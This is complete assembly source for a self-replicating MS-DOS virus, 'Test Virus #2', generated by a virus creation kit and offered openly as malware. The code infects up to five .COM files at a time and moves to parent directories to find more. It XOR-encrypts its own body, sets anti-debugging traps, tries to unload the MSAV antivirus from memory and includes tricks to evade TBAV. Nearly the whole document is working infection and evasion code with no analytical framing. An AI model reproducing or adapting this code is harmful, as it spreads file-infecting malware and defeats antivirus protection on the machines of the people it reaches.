

; Virus-Name:                      'Test Virus #2'
; Virus-ID:                        '[T2]'
; Author:                          'Hacking Hell'
; Author ID:                       '[HH]'
; Creator:                         '[IE-VCC v0.19á]'
; Creator ID:                      '[IE]'
          
.Model Tiny                        ; Every seen a .Model Huge in a virus?!?
.Radix 16                          ; Standard Hexadecimal
.Code                              ; Code segment
          
Dummy:                             ; This is the fake host (dummy)
          db      0E9,03,00        ; JuMP to S_O_V (Start Of Virus)
          db      'C'              ; Already infected marker
          Int     20               ; Exit from fake host
          
S_O_V:                             ; Start Of Virus
          
          Push    CS               ; Some crap to fool TBAV
          Pop     DS               ; Crap!
          
          Mov     AX,0FA01         ; Let's take down MSAV
          Mov     DX,5945
          Int     16
          
          Call     GetDeltaOfs     ; Get the delta offset
GetDeltaOfs:
          Pop      BP              ; BP is equal to IP
          Sub      BP,Offset GetDeltaOfs  ; Now BP is really initiated!
          
          Call    En_Decrypt       ; Call the encryption / Decryption driver
          
          Jmp     CodeSt           ; TBAV Won't trace this ?!?
          Int     20               ; For TBAV this is the end of the virus ?!?
          
S_O_E:                             ; Start Of Encrypted part
CodeSt:                            ; This is where the virus really starts
          Lea     SI,[Offset Original_Bytes+BP]  ; Source pointer for orig. bytes
          Mov     DI,0100          ; Destination pointer
          Movsw
          Movsw
          
          Push    CS               ; CS <==> DS
          Pop     DS
          
          Lea     DX,[E_O_V+BP]    ; Set DTA address to End Of Virus
          Mov     AH,1A
          Int     21
          Mov     AX, 3501         ; 'Uninstall' int 1
          Push    CS               ; ES == CS
          Pop     ES
          Lea     BX,[DebugShit+BP]
          Sub     AX, 1000         ; Fool TBAV
          Int     21
          
          Mov     AL, 03           ; 'Uninstall' int 3
          Int     21
          Jmp     NoShit           ; Don't go into the shit!
DebugShit:                         ; This will write a string and loop infinite!
          Lea     DX, [ShitMessage+BP]
          Push    CS
          Pop     DS
          Mov     AH, 09
          Int     21
          Jmp     $
ShitMessage:                       ; This is the anti-debug message!
          Db      'DEBUGGING IS VERY ILLEGAL (NOT!)', 0A, 0D, 07
          Db      '$'              ; End of text marker
NoShit:                            ; Don't shit the CPU
          
Spread:                            ; Here is the file-search routine
          Mov     Byte Ptr[Infections+BP],0  ; Reset infection counter
Spraed:                            ; This label is used by Traverse
          Mov     AH,4E            ; Find first matching file
          Lea     DX, [Offset FileSpec+BP]
          
FindNext:                          ; Here will be the INT 21 call
          Cmp     Byte Ptr [Infections+BP],5  ; Check if all infections are done
          Je      Reset_DTA        ; Yes? Reset the DTA and call activation routines
          
          Mov    Byte Ptr [Offset FileSpec+BP],'*'  ; Fool TBAV from finding '*.COM'
          Int     21
          Jc      Traverse         ; No more files, then traverse
          Call    InfectFile       ; Call to the infection routine
          
NextFile:                          ; Set AH to findnext
          Mov     AH,4F
          Jmp     FindNext
          
Traverse:                          ; The traversal routine:
          Mov     AH,3Bh           ; Change Directory (H must be or TASM thinks binary)
          Lea     DX,[Offset TravelSpec+BP]  ; Pointer to '..' specification
          Int     21
          Jnc     Spraed
          
Reset_DTA:                         ; Reset the Disk Transfer Address
          Mov     AH,1A            ; Set DTA Address
          Mov     DX,80            ; to 80Hex
          Int     21
          
          Call    Activations      ; Call the activation Routine(s)
          
          Mov     DI,0100          ; Give control to original program
          Push    DI               ; Simulate a call
          Ret
          
Activations:                       ; Place your activation Routines here!
          
          Ret
VirusName:                         ; Name Of the virus
          DB      'Test Virus #2',0
AuthorName:                        ; Name Of the author
          DB      'Hacking Hell',0
Creator:                           ; Name of the creator
          DB      'I-EAS Virus Creation Centre v0.19á',0
VirusID:                           ; ID of the virus
          DB      '[T2]',0
AuthorID:                          ; ID of the author
          DB      '[HH]',0
CreatorID:                         ; ID of the creator
          DB      '[IE-VCC v0.19á]',0
          
Original_Bytes:                    ; Original bytes will be stored here
          DB      90,90,90,90      ; Fake host: 4 NOPs
Jump_Table:                        ; This is the jump table that will be put
          DB      0E9,03,00,'C'    ;  in the beginning of the victim
Infections:                        ; Infection counter
          DB      0
FileSpec:                          ; Filefind Spec
          DB      '+.COM',0        ; Filefind Spec (+ Will change into *)
TravelSpec:                        ; Change Directory Spec (..)
          DB      '..',0
          
InfectFile:                        ; The Infection Routine:
          Mov     Byte Ptr [FileSpec+BP],'+'  ; Turn the * in a +
          Lea     DX,[E_O_V+1E+BP]  ; Open the victim
          Mov     AX,3D02
          Int     21
          Jnc     InfectIt         ; If file opened OK infect it!
          Ret
          
InfectIt:                          ; The real infection Routine
          Xchg    BX,AX            ; Copy handle in BX
          
          Mov     CX,0004          ;Read first 4 bytes for check
          Mov     AH,3F            ; if already infected!
          Lea     DX,[Original_Bytes+BP]
          Int     21
          
          Cmp    Byte Ptr [Original_Bytes+3+BP],'C'  ; Already Infected
          Jz     Shut_File         ; Close & Next file
          
          Mov     AX,4202          ; Goto E_O_F
          Sub     CX,CX            ; 2 byte version of Mov CX,0!!
          Cwd                      ; 1 Byte version of Mov DX,0!!
          Int     21
          
          Sub     AX,0003h         ; Initialize Jump Table
          Mov     Word Ptr [Jump_Table+1+BP],AX
          
          Mov     AX,4200          ; Goto S_O_F
          Sub     CX,CX
          Cwd
          Int     21
          
          Mov     AX,4000          ; Write jump table over the original
          Mov     CX,0004          ;  four bytes
          Lea     DX,[Jump_Table+BP]
          Int     21
          Inc     Byte Ptr [Infections+BP]  ; Increase infection count
          
          Mov     AX,4202          ; Goto E_O_F
          Sub     CX,CX            ; 2 byte version of Mov CX,0!!
          Cwd                      ; 1 Byte version of Mov DX,0!!
          Int     21
          
          Mov     AH,2C            ; Get a random XOR value for the Encryption
          Int     21
          Mov     Byte Ptr [En_De_Code+BP],DL
          
E_O_E:                             ; End Of Encrypted Part
          Call    En_Decrypt       ; Encrypt the virus
          
          Mov     AH,40            ; Implend virus code in the victim
          Mov     CX,(E_O_V - S_O_V)  ; Calculate Size
          Lea     DX,[S_O_V+BP]    ; Starting location
          Int     21
          
          Call    En_Decrypt       ; Decrypt the virus
          
Shut_File:                         ; Close the victim file
          Mov     AH,3E
          Int     21
          Ret                      ; End of infection routine
          
En_Decrypt:                        ; Here is the En / De cryption routine
          Lea     SI,[Offset S_O_E+BP]  ; Start of encrypted part
          Mov     CX,(E_O_E - S_O_E)  ; Size of encrypted part
Cryption_Loop:                     ; Here's the loop for the Routine
          DB      80,34            ; Xor Byte Ptr [SI], xx
En_De_Code:                        ; Here will be the XOR value (xx)
          DB      00               ; Not initiated yet
          Inc     SI
          Dec     CX
          Jnz     Cryption_Loop
          Ret
          
E_O_V:                             ; End Of Virus label
          End     Dummy            ; Set starting IP to the fake host
          
; This virus has been produced by IE-Virus Creation Centre v0.19á
; Some specific information about this creation: 
;  + It an appending .COM file infector
;  + It is encrypted
;  + It has minor capabilities to make the code untraceble
;  + If there are not enough uninfected files, it travels to '..'
;  + It uses several techniques to fool TBAV
;  + It takes down MSAV from memory

</==>